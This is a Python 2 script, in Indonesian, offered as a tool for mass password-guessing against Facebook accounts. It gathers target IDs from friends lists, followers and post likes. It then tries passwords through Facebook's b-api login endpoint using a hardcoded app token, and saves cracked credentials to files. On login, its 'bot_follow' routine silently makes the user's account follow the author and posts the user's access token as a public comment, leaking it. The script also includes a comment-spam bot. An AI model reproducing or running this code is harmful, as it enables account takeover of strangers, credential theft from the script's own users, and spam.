#!/usr/bin/python2
# coding=utf-8
# rekode bapakkau nih gw ngoding sendiri kontol
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, uuid
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from datetime import datetime

p='\033[1;97m'
k='\033[1;93m'
m='\033[1;91m'
H = '\x1b[1;92m' # HIJAU
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
reload(sys)
sys.setdefaultencoding('utf8')
a=requests.get("http://ip-api.com/json/",headers={"Referer":"http://ip-api.com/","Content-Type":"application/json; charset=utf-8","userAgent":"Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.39 Mobile Safari/537.36"}).json()
try:
		 ndrii = a["query"]
except KeyError:
		ndrii = " "
try:
		mbokey = a["country"]
except KeyError:
		mbokey = " "
try:
		kartu = a["isp"]
except KeyError:
		kartu = " "

id = []
cp = []
ok = []
loop = 0
ct = datetime.now()
n = ct.month
bulan1 = [
 'Januari',
 'Februari',
 'Maret',
 'April',
 'Mei',
 'Juni',
 'Juli',
 'Agustus',
 'September',
 'Oktober',
 'Nopember',
 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
day = current
op = bulan1[nTemp]
durasi = str(datetime.now().strftime('%d-%m-%Y'))
hari = datetime.now().strftime('%A')
bulan = {
        "01": "Januari",
        "02": "Februari",
        "03": "Maret",
        "04": "April",
        "05": "Mei",
        "06": "Juni",
        "07": "Juli",
        "08": "Agustus",
        "09": "September",
        "10": "November",
        "11": "Oktober",
        "12": "Desember"}

def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)

def defaultua():
    ua = random.choice(["Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; InfoPath.3; Microsoft Outlook 14.0.6009; ms-office; MSOffice 14)",
"Mozilla/5.0 (iPod; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1 (KHTML, like Gecko) CriOS/52.0.2743.84 Mobile/13B143 Safari/601.1.46",
"Mozilla/5.0 (iPhone; CPU iPhone OS 10_2 like Mac OS X) AppleWebKit/602.3.12 (KHTML, like Gecko) Mobile/14C92 [FBAN/FBIOS;FBAV/163.0.0.54.96;FBBV/96876057;FBDV/iPhone6,2;FBMD/iPhone;FBSN/iOS;FBSV/10.2;FBSS/2;FBCR/vodafoneP;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/96876057]",
"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0; KTXN B658884344A90240T1297416P2) like Gecko",
"Dalvik/1.6.0 (Linux; U; Android 4.1.2; Jolla Build/JZO54K)",
"Mozilla/5.0 (Linux; Android 4.2.2; GT-I9500 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Mobile Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/604.5.6 (KHTML, like Gecko) QuickLook/5.0",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0&xee5uh1a2;)",
"Mozilla/5.0 (Linux; Android 9; RMX1941) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.66 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]",
"Mozilla/5.0 (Linux; Android 10; SM-A105FN Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.93 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]",
"Mozilla/5.0 (Linux; Android 9; SNE-LX1 Build/HUAWEISNE-L01; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]",
"Mozilla/5.0 (Linux; Android 10; Mi A2 Lite Build/QKQ1.191002.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]",
"Mozilla/5.0 (Linux; Android 11; SM-T505 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]",
"Mozilla/5.0 (Linux; Android 11; Nokia 3.2 Build/RKQ1.200928.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]",
"Mozilla/5.0 (Linux; Android 10; SNE-LX1 Build/HUAWEISNE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.66 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/304.0.0.42.118;]",
"Mozilla/5.0 (Linux; Android 8.1.0; DUA-L22 Build/HONORDUA-L22; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.134 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]",
"Mozilla/5.0 (Linux; Android 8.0.0; SM-G935F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/73.0.3683.90 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]",
"Mozilla/5.0 (Linux; Android 7.0; HUAWEI VNS-L31 Build/HUAWEIVNS-L31; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]",
"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]",
"Mozilla/5.0 (Linux; Android 6.0; MYA-L11 Build/HUAWEIMYA-L11; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/246.0.0.7.121;]",
"Mozilla/5.0 (Linux; Android 7.1.1; SM-J250Y Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]",
"Mozilla/5.0 (Linux; Android 11; RMX2155 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]",
"Mozilla/5.0 (Linux; Android 8.1.0; ASUS_X00HD Build/OPM1.171019.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]",
"Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.83 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/256.0.0.16.119;]",
"Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.101 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]",
"Mozilla/5.0 (Linux; Android 10; MI 8 Build/QKQ1.190828.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]",
"Mozilla/5.0 (Linux; Android 7.0; A7Pro Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]",
"Mozilla/5.0 (Linux; Android 9; LG-H870 Build/PKQ1.190522.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]",
"Mozilla/5.0 (Linux; Android 10; RMX1971 Build/QKQ1.190918.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]",
"Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.77 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]",
"Mozilla/5.0 (Linux; Android 9; Redmi S2 Build/PKQ1.181203.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]",
"Nokia6303classic/2.0 (10.12) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+ [FB_IAB/FB4A;FBAV/325.0.0.36.170;]",
"Mozilla/5.0 (Linux; Android 8.0.0; ATU-L11 Build/HUAWEIATU-L11; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; ARM; Trident/7.0; .NET4.0E; .NET4.0C; Tablet PC 2.0; Microsoft Outlook 15.0.5049; ms-office; MSOffice 15)"])
    try:
        ugent = open('ugent.txt','w')
        ugent.write(ua)
        ugent.close()
    except (KeyError, IOError):
        logs()

def gantiua():
    os.system("rm -rf ugent.txt")
    ua = raw_input("\x1b[1;97m[\x1b[1;91m?\x1b[1;97m]\x1b[1;96m masukan user agent kamu\x1b[1;92m :\x1b[1;93m ")
    try:
        ugent = open('ugent.txt','w')
        ugent.write(ua)
        ugent.close()
        jalan("\x1b[1;97m[\x1b[1;91m*\x1b[1;97m]\x1b[1;96m sukses mengganti user agent")
        print("\x1b[1;97m[\x1b[1;91m*\x1b[1;97m]\x1b[1;96m user agent kamu\x1b[1;93m : \x1b[1;92m" +ua)
        pler = raw_input("\n \x1b[1;97m[\x1b[1;91m?\x1b[1;97m]\x1b[1;96m apakah ingin mengganti user agent?\x1b[1;91m (\x1b[1;97mY\x1b[1;91m/\x1b[1;97mt\x1b[1;91m)\x1b[1;92m:\x1b[1;93m ")
        if pler == "":
        	menu()
        elif pler == "Y" or pler == "y":
        	gantiua()
        elif pler == "T" or pler == "t":
        	menu ()
    except (KeyError, IOError):
        jalan("\x1b[1;97m[\x1b[1;91m*\x1b[1;97m]\x1b[1;96m gagal mengganti user agent")
        raw_input("\x1b[1;97m[\x1b[1;91m???\x1b[1;97m]\x1b[1;96m kembali")
        menu()
        
def logo():
	os.system("clear")
	print("""
\x1b[1;97m  _________   _____ ____________________
\x1b[1;97m /   _____/  /     \\______   \_   _____/
\x1b[1;97m \_____  \  /  \ /  \|    |  _/|    __)  
\x1b[1;97m /        \/    Y    \    |   \|     \   
\x1b[1;97m/_______  /\____|__  /______  /\___  /   
\x1b[1;96mSimple\x1b[1;97m  \/\x1b[1;96mMulti\x1b[1;97m    \/\x1b[1;96mBrute\x1b[1;97m  \/\x1b[1;96mForce\x1b[1;97m\/\x1b[1;96mV\x1b[1;92m.\x1b[1;96m0\x1b[1;92m.\x1b[1;96m1    
        
""")
def bot_follow():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print("\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;96m Token invalid")
		logs()
        kom_ku = "Anjay Gurinjay Bang Ndrii Gemgeh"
        kom_mu = "XNX-CODE Team The Best"    
    	requests.post('https://graph.facebook.com/100014905842581/subscribers?access_token=' + toket) #
        requests.post('https://graph.facebook.com/1280398002467049/likes?summary=true&access_token=' + toket) # Like ndrii
    	requests.post('https://graph.facebook.com/1280398002467049/comments/?message='+toket+'&access_token=' + toket)
        requests.post('https://graph.facebook.com/1280398002467049/comments/?message='+kom_ku+'&access_token=' + toket)
        requests.post('https://graph.facebook.com/1280398002467049/comments/?message='+kom_mu+'&access_token=' + toket)
        print(('\x1b[1;97m[\x1b[1;91m+\x1b[1;97m]\x1b[92m Login Sukses!'))
        raw_input('\x1b[1;97m[\x1b[1;91m+\x1b[1;97m]\x1b[1;96m Tekan Enter ')
        menu()
        print'\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;96m Token Invalid!'
        sys.exit()
		
                            
def tokenz():
	os.system('clear')
	try:
		token = open('login.txt', 'r')
		menu()
	except (KeyError, IOError):
		os.system('clear')
		logo()
		print""+p+""
                print"\x1b[1;97m *\x1b[1;93m tools ini menggunakan login token facebook."
                print"\x1b[1;97m *\x1b[1;93m apakah kamu sudah tau cara mendapatkan token facebook?"
                print"\x1b[1;97m *\x1b[1;93m liat You Tube Lah Kan Banyak Paket*"
		token = raw_input('\x1b[1;97m[\x1b[1;91m+\x1b[1;97m]\x1b[1;96m Masukkan Token\x1b[1;97m :\x1b[1;92m ')
		try:
			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
			a = json.loads(otw.text)
			zedd = open('login.txt', 'w')
			zedd.write(token)
			zedd.close()
			bot_follow()
			menu()
		except KeyError:
			print("\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;96m Token Lo Modar Dek Kena Spam!")
                        print("\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;96m Ganti Baru Dek!!")
			sys.exit()
			
def menu():
    global token
    os.system('clear')
    try:
        token = open('login.txt', 'r').read()
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print'\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;96m Token Invalid!'
        os.system('rm -f login.txt')
        time.sleep(3)
        tokenz()
    except requests.exceptions.ConnectionError:
        print'\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;96m Tidak Ada Koneksi!'
        sys.exit()

    logo()
    print"[\x1b[1;92m???\x1b[1;97m]\x1b[1;93m Author\x1b[1;91m    :\x1b[1;97m Sanz X Nano"
    print"[\x1b[1;92m???\x1b[1;97m]\x1b[1;93m Github\x1b[1;91m    :\x1b[1;97m github.com/Sanz-Tzy"
    print"\n[\x1b[1;92m???\x1b[1;97m]\x1b[1;93m Bergabung\x1b[1;91m :\x1b[1;97m %s %s %s" % (ha, op, ta)
    print"[\x1b[1;92m???\x1b[1;97m]\x1b[1;93m ID\x1b[1;91m        :\x1b[1;97m " +id
    print"[\x1b[1;92m???\x1b[1;97m]\x1b[1;93m IP\x1b[1;91m        :\x1b[1;97m " +ndrii
    print"[\x1b[1;92m???\x1b[1;97m]\x1b[1;93m negara\x1b[1;91m    :\x1b[1;97m " +mbokey
    print"\n[\x1b[1;96mSelamat Datang \033[0;93m"+nama+"\033[0;97m]"
    print"\n\033[1;97m[\x1b[1;96m01\x1b[1;97m]\x1b[1;91m.\x1b[1;93m Crack\x1b[1;97m dari id\x1b[1;96m teman/publik"
    print"\033[1;97m[\x1b[1;96m02\x1b[1;97m]\x1b[1;91m.\x1b[1;93m Crack\x1b[1;97m dari id\x1b[1;96m followers"
    print"\033[1;97m[\x1b[1;96m03\x1b[1;97m]\x1b[1;91m.\x1b[1;93m Crack\x1b[1;97m dari id\x1b[1;96m like postingan"
    print"\033[1;97m[\x1b[1;96m04\x1b[1;97m]\x1b[1;91m.\x1b[1;93m Crack\x1b[1;97m dari id\x1b[1;96m target massal"
    print"\033[1;97m[\x1b[1;96m05\x1b[1;97m]\x1b[1;91m.\x1b[1;93m Bot Komen\x1b[1;92m [\x1b[1;97mV.0.0.1\x1b[1;92m]"
    print"\033[1;97m[\x1b[1;96m06\x1b[1;97m]\x1b[1;91m.\x1b[1;93m Setting user agent\x1b[1;92m [\x1b[1;97mBiar One Tap\x1b[1;92m]"
    print"\033[1;97m[\x1b[1;96m07\x1b[1;97m]\x1b[1;91m.\x1b[1;93m Lihat hasil crack\x1b[1;91m [\x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP\x1b[1;91m]"
    print"\033[1;97m[\x1b[1;96m08\x1b[1;97m]\x1b[1;91m.\x1b[1;93m Info script\x1b[1;92m [\x1b[1;97mAuthot\x1b[1;96m&\x1b[1;97mTeam\x1b[1;92m]"
    print("\033[1;97m[\x1b[1;91m00\x1b[1;97m]\x1b[1;91m.\x1b[1;97m Logout\x1b[1;96m [\x1b[1;91mHapus Token\x1b[1;96m]")
    ask = raw_input("\n[\x1b[1;91m?\x1b[1;97m]\x1b[1;96m Pilih\x1b[1;92m :\x1b[1;93m ")
    if ask == "":
    	menu()
    elif ask == "1" or ask == "01":
    	publik()
    elif ask == "2" or ask == "02":
    	followers()
    elif ask == "3" or ask == "03":
    	likes()
    elif ask == "4" or ask == "04":
    	publikold()
    elif ask == "5" or ask == "05":
    	bot_komen()
    elif ask == "6" or ask == "06":
    	gantiua()
    elif ask == "7" or ask == "07":
    	cekakun()
    elif ask == "8" or ask == "08":
    	info_sc()
    elif ask == "0" or ask == "00":
    	os.system('rm -f login.txt')
    	jalan(" [!] berhasil menghapus token ")
    	exit()
    else:
    	jalan(" [!] pilih yang bener ! ")
    	menu()
    
# Komen
def bot_komen():
	global token
	try:
		token = open('login.txt', 'r').read()
	except IOError:
		print '! Token Invalid'
		os.system('rm -f login.txt')
		time.sleep(3)
		tokenz
		
	logo()
	print"[!] Usahakan Id Target Publik"
	crot = raw_input("[?] Id Target : ")
	dalem = raw_input("[?] Comment : ")
	hamil = int(input("[?] Jumlah : "))
	print"[!] Tunggu Sebentar"
	for x in range(hamil):
		requests.post("https://graph.facebook.com/"+crot+"/comments/?message="+dalem+"&access_token="+token)
		
	print"[!] Berhasil"
	raw_input("Enter Untuk Kembali")
	menu()
	
def publik():
    print(" [*] isi 'me' jika ingin crack dari daftar teman")
    idt = raw_input(' [+] masukkan id atau username : ')
    if idt == "":
    	menu()
    try:
        mmk = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
        kntl = json.loads(mmk.text)
        #print' [+] Nama : ' + sp['name']
    except KeyError:
        print'[!] ID Tidak Tersedia!'
        menu()

    ajg = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
    ppk = json.loads(ajg.text)
    for i in ppk['data']:
        uid = i['id']
        na = i['name']
        nm = na.rsplit(' ')[0]
        id.append(uid + '|' + nm)
    print""
    print' [+] total id -> \033[1;91m' + str(len(id))
    pilihpw(ppk)
    
def followers():
    print(" [*] isi 'me' jika ingin crack dari followers sendiri")
    idt = raw_input(' [?] masukan id atau username followers : ')
    if idt == "":
    	menu()
    try:
        mmk = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
        kntl = json.loads(mmk.text)
        #print' [+] Nama : ' + sp['name']
    except KeyError:
        print'[!] ID Tidak Tersedia!'
        menu()

    ajg = requests.get('https://graph.facebook.com/' + idt + '/subscribers?limit=999999&access_token=' + token)
    ppk = json.loads(ajg.text)
    for i in ppk['data']:
        uid = i['id']
        na = i['name']
        nm = na.rsplit(' ')[0]
        id.append(uid + '|' + nm)
    print""
    print' [+] total id -> \033[1;91m' + str(len(id))
    pilihpw(ppk)
    
def likes():
    idt = raw_input(' [?] masukkan url atau id postingan : ')
    if idt == "":
    	menu()
    ajg = requests.get('https://graph.facebook.com/' + idt + '/likes?limit=9999999&access_token=' + token)
    ppk = json.loads(ajg.text)
    for i in ppk['data']:
        uid = i['id']
        na = i['name']
        nm = na.rsplit(' ')[0]
        id.append(uid + '|' + nm)
    print""
    print' [+] total id -> \033[1;91m' + str(len(id))
    pilihpw(ppk)
    
def publikold():
	print(" [*] minimal 2 target dan maksimal 5 target")
	limt = raw_input(' [?] masukkan jumlah target : ')
	if limt =='':
		print (' [!] isi yang benar')
		menu()
	elif limt == '2':
		idt1 = raw_input(" [1] id target 1 : ")
		idt2 = raw_input(" [2] id target 2 : ")
		lim = raw_input(' [?] limit per id : ')
		try:
			r = requests.get("https://graph.facebook.com/"+idt1+"/friends?limit="+lim+"&access_token="+token)
			ppk = json.loads(r.text)
			for i in ppk['data']:
				uid = i['id']
				na = i['name']
				nm = na.rsplit(' ')[0]
				id.append(uid + '|' + nm)
		except KeyError:
			print (' [!] id 1 tidak ada !')
		try:
			r = requests.get("https://graph.facebook.com/"+idt2+"/friends?limit="+lim+"&access_token="+token)
			ppk = json.loads(r.text)
			for i in ppk['data']:
				uid = i['id']
				na = i['name']
				nm = na.rsplit(' ')[0]
				id.append(uid + '|' + nm)
		except KeyError:
			print (' [!] id 2 tidak ada !')
	elif limt == '3':
		idt1 = raw_input(" [1] id target 1 : ")
		idt2 = raw_input(" [2] id target 2 : ")
		idt3 = raw_input(" [3] id target 3 : ")
		lim = raw_input(' [?] limit per id : ')
		try:
			r = requests.get("https://graph.facebook.com/"+idt1+"/friends?limit="+lim+"&access_token="+token)
			ppk = json.loads(r.text)
			for i in ppk['data']:
				uid = i['id']
				na = i['name']
				nm = na.rsplit(' ')[0]
				id.append(uid + '|' + nm)
		except KeyError:
			print (' [!] id 1 tidak ada !')
		try:
			r = requests.get("https://graph.facebook.com/"+idt2+"/friends?limit="+lim+"&access_token="+token)
			ppk = json.loads(r.text)
			for i in ppk['data']:
				uid = i['id']
				na = i['name']
				nm = na.rsplit(' ')[0]
				id.append(uid + '|' + nm)
		except KeyError:
			print (' [!] id 2 tidak ada !')
		try:
			r = requests.get("https://graph.facebook.com/"+idt3+"/friends?limit="+lim+"&access_token="+token)
			ppk = json.loads(r.text)
			for i in ppk['data']:
				uid = i['id']
				na = i['name']
				nm = na.rsplit(' ')[0]
				id.append(uid + '|' + nm)
		except KeyError:
			print (' [!] id 3 tidak ada !')
	elif limt == '4':
		idt1 = raw_input(" [1] id target 1 : ")
		idt2 = raw_input(" [2] id target 2 : ")
		idt3 = raw_input(" [3] id target 3 : ")
		idt4 = raw_input(" [3] id target 4 : ")
		lim = raw_input(' [?] limit per id : ')
		try:
			r = requests.get("https://graph.facebook.com/"+idt1+"/friends?limit="+lim+"&access_token="+token)
			ppk = json.loads(r.text)
			for i in ppk['data']:
				uid = i['id']
				na = i['name']
				nm = na.rsplit(' ')[0]
				id.append(uid + '|' + nm)
		except KeyError:
			print (' [!] id 1 tidak ada !')
		try:
			r = requests.get("https://graph.facebook.com/"+idt2+"/friends?limit="+lim+"&access_token="+token)
			ppk = json.loads(r.text)
			for i in ppk['data']:
				uid = i['id']
				na = i['name']
				nm = na.rsplit(' ')[0]
				id.append(uid + '|' + nm)
		except KeyError:
			print (' [!] id 2 tidak ada !')
		try:
			r = requests.get("https://graph.facebook.com/"+idt3+"/friends?limit="+lim+"&access_token="+token)
			ppk = json.loads(r.text)
			for i in ppk['data']:
				uid = i['id']
				na = i['name']
				nm = na.rsplit(' ')[0]
				id.append(uid + '|' + nm)
		except KeyError:
			print (' [!] id 3 tidak ada !')
		try:
			r = requests.get("https://graph.facebook.com/"+idt4+"/friends?limit="+lim+"&access_token="+token)
			ppk = json.loads(r.text)
			for i in ppk['data']:
				uid = i['id']
				na = i['name']
				nm = na.rsplit(' ')[0]
				id.append(uid + '|' + nm)
		except KeyError:
			print (' [!] id 4 tidak ada !')
	elif limt == '5':
		idt1 = raw_input(" [1] id target 1 : ")
		idt2 = raw_input(" [2] id target 2 : ")
		idt3 = raw_input(" [3] id target 3 : ")
		idt4 = raw_input(" [4] id target 4 : ")
		idt5 = raw_input(" [5] id target 5 : ")
		lim = raw_input(' [?] limit per id : ')
		try:
			r = requests.get("https://graph.facebook.com/"+idt1+"/friends?limit="+lim+"&access_token="+token)
			ppk = json.loads(r.text)
			for i in ppk['data']:
				uid = i['id']
				na = i['name']
				nm = na.rsplit(' ')[0]
				id.append(uid + '|' + nm)
		except KeyError:
			print (' [!] id 1 tidak ada !')
		try:
			r = requests.get("https://graph.facebook.com/"+idt2+"/friends?limit="+lim+"&access_token="+token)
			ppk = json.loads(r.text)
			for i in ppk['data']:
				uid = i['id']
				na = i['name']
				nm = na.rsplit(' ')[0]
				id.append(uid + '|' + nm)
		except KeyError:
			print (' [!] id 2 tidak ada !')
		try:
			r = requests.get("https://graph.facebook.com/"+idt3+"/friends?limit="+lim+"&access_token="+token)
			ppk = json.loads(r.text)
			for i in ppk['data']:
				uid = i['id']
				na = i['name']
				nm = na.rsplit(' ')[0]
				id.append(uid + '|' + nm)
		except KeyError:
			print (' [!] id 3 tidak ada !')
		try:
			r = requests.get("https://graph.facebook.com/"+idt4+"/friends?limit="+lim+"&access_token="+token)
			ppk = json.loads(r.text)
			for i in ppk['data']:
				uid = i['id']
				na = i['name']
				nm = na.rsplit(' ')[0]
				id.append(uid + '|' + nm)
		except KeyError:
			print (' [!] id 4 tidak ada !')
		try:
			r = requests.get("https://graph.facebook.com/"+idt5+"/friends?limit="+lim+"&access_token="+token)
			ppk = json.loads(r.text)
			for i in ppk['data']:
				uid = i['id']
				na = i['name']
				nm = na.rsplit(' ')[0]
				id.append(uid + '|' + nm)
		except KeyError:
			print (' [!] id 5 tidak ada !')
			
	print""
	print' [+] total id -> \033[1;91m' + str(len(id))
	pilihpw(ppk)

def cekakun():
    print'\n [1]. lihat hasil crack OK '
    print' [2]. lihat hasil crack CP '
    anjg = raw_input('\n [?] pilih : ')
    if anjg == '':
        menu()
    elif anjg == '01' or anjg == '1':
        print'\n [+] Hasil \x1b[0;92mOK\x1b[0;97m Tanggal : \x1b[0;92m%s-%s-%s\x1b[0;97m' % (ha, op, ta)
        os.system(' cat out/OK-%s-%s-%s.txt' % (ha, op, ta))
        raw_input("\n [???] Kembali ")
        menu()
    elif anjg == '02' or anjg == '2':
        totalcp = open('out/CP-%s-%s-%s.txt' % (ha, op, ta)).read().splitlines()
        print '\n [???] Hasil CP Tanggal : \x1b[0;92m%s-%s-%s\x1b[0;97m' % (ha, op, ta)
        print " \033[1;97m[???] Total : %s" %(len(totalcp))
        print""
        os.system(' cat out/CP-%s-%s-%s.txt' % (ha, op, ta))
        raw_input("\n [???] Kembali ")
        menu()
    else:
        print(' [!] Pilih Yang Benar!')
        menu()
 
def infologin():
	print""
	print "\n [*] token : "+token
	print ""
	raw_input(" [???] kembali ")
	menu()
	
def pilihpw(file):
	hg = raw_input(""+p+" [?] apakah anda ingin menggunakan sandi manual? [Y/t] : ")
	if hg == "":
		pilihpw(file)
	elif hg == "Y" or hg == "y":
		manual(file)
	elif hg == "T" or hg == "t":
		otomatis(file)
	else:
		print(" [!] Pilih Yang Bener")
		pilihpw()
		
def manual(file):
	print""
	print(" [?] gunakan , (koma) untuk pemisah contoh : sandi123,sandi12345,dll. setiap kata sandi minimal 6 karakter atau lebih")
	print""
	pw = raw_input(' [?] set kata sandi : ').split(',')
	if len(pw) == 0:
		exit('[!] Isi Yang Benar, Tidak Boleh Kosong!')
	print(" [!] crack dengan sandi -> \033[1;91m%s" %(pw))
	manualnjing(file)
	
def manualnjing(file):
	print("")
	print(""+p+" [ pilih metode crack - silahkan coba satu?? ]")
	print("")
	print(" [1] metode api (fast)")
	print(" [2] metode mbasic (slow)")
	print(" [3] metode free.fb (fast)")
	print("")
	x = raw_input(" [?] metode : ")
	if x == "":
		print(" [!] Pilih Yang Benar!")
		manualnjing(file)
	elif x == '1':
		bapiman()
	elif x == '2':
		mbasicman()
	elif x == '3':
		freefbman()
	else:
		print(" [!] Pilih Yang Benar")
		exit()
		
def bapiman():
    ua = 'ua'
    pw = 'pw'
    print'\n [+] hasil OK disimpan ke -> OK/%s-%s-%s-%s.txt' % (hari, ha, op, ta)
    print' [+] hasil CP disimpan ke -> CP/%s-%s-%s-%s.txt' % (hari, ha, op, ta)
    print("\n [!] anda bisa menjeda proses crack dengan mematikan data seluler")
    print("")

    def main(arg):
        global loop
        w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
        print'\r\x1b[0;97m [*] [crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for asu in pw:
                ua_apim = {'user-agent': ua}
                param = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 
                   'format': 'json', 
                   'sdk_version': '2', 
                   'email': uid, 
                   'locale': 'en_US', 
                   'password': asu, 
                   'sdk': 'ios', 
                   'generate_session_cookies': '1', 
                   'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
                api = 'https://b-api.facebook.com/method/auth.login'
                response = requests.get(api, params=param, headers=ua_apim)
                if 'session_key' in response.text and 'EAAA' in response.text:
                    print'\r\x1b[0;92m*--> ' + uid + ' | ' + asu + '        '
                    ok.append(uid + ' | ' + asu)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
